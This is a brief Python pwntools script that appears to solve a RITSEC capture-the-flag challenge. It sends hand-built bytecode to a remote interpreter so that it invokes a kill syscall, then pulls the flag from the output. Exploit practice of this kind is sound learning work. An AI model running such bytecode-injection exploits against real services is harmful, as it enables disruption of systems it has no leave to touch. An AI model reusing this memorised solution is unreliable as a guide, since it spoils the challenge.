#!/usr/bin/env python3
from pwn import remote, p32
import struct
import re

HOST = "marauder.ctf.ritsec.club"
PORT = 1112

# Bytecode:
# 0000: OP_CONSTANT 0   ; push constant[0] = 3
# 0002: OP_SVC kill     ; pop -> kill(pid)
# 0004: OP_RETURN
payload = p32(1) + struct.pack("<d", 3.0) + bytes([0, 0, 2, 1, 1])

io = remote(HOST, PORT)
io.recvline(timeout=2)  # "interpreting"
io.send(payload)
out = io.recvall(timeout=2)
io.close()

print(out.decode(errors="ignore"), end="")

m = re.search(rb"RS\{[^\n]+\}", out)
if m:
    print(m.group(0).decode())
